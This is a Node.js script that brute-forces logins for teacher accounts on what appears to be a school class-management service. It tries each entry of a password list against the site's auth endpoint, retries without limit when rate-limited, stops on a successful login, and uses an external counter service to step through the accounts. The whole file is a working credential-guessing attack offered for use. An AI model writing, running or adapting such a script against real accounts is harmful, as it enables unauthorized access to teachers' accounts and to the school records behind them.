import fs from "fs";
import axiosRetry from "axios-retry";
import axios from "axios";

const passwords = fs
  .readFileSync("./passwords.txt", "utf-8")
  .trim()
  .split("\n");

const teachers = fs.readFileSync("./teachers.txt", "utf-8").trim().split("\n");

let current = Number(
  await axios
    .get("https://counter-api.napdev.workers.dev/")
    .then((res) => res.data)
);

axiosRetry(axios, {
  retryCondition: (result) => result.response.status === 429,
  retries: Infinity,
  retryDelay: 60,
});

const teacher = teachers[current];

for (const [index, password] of passwords.entries()) {
  try {
    const { data, status, statusText } = await axios.post(
      "https://ltv-api.quanlylop.com/auth/local",
      {
        identifier: teacher,
        password,
      }
    );

    console.log(
      `${teacher} - (${index + 1}) ${password}: OK ${status} ${statusText} ${
        data?.message?.[0]?.messages?.[0]?.message
      }`
    );

    process.exit(1);
  } catch (error) {
    console.log(
      `${teacher} - (${index + 1}) ${password}: Failed ${
        error.response.status
      } ${error.response.statusText} ${
        error.response.data?.message?.[0]?.messages?.[0]?.message
      }`
    );
  }
}

await axios.post("https://counter-api.napdev.workers.dev/");
